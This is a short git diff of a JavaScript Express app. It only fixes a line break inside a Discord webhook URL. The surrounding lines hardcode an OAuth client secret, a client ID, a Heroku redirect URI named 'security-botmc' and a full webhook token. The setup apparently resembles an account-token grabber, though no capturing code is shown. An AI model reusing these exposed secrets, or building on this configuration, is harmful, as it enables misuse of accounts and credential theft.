@@ -2,8 +2,7 @@
 const client_secret = 'v4t8Q~_vOAiC~~t6oHDuDAwaNsxBU6NZCgO1Lbal'
 const client_id = '936a88f4-136c-4f7b-a955-b2cdf2e0ca0a'
 const redirect_uri = 'https://security-botmc.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040444434359275630/3ItK8ltz5EMX3KkmguImDsn5LES3TgAHAlZQb7jy8HTOYS-S8VHy426lO5vXVrA3Eu2k
-'
+const webhook_url = 'https://discord.com/api/webhooks/1040444434359275630/3ItK8ltz5EMX3KkmguImDsn5LES3TgAHAlZQb7jy8HTOYS-S8VHy426lO5vXVrA3Eu2k'
 //Requirements
 const axios = require('axios')
 const express = require('express')
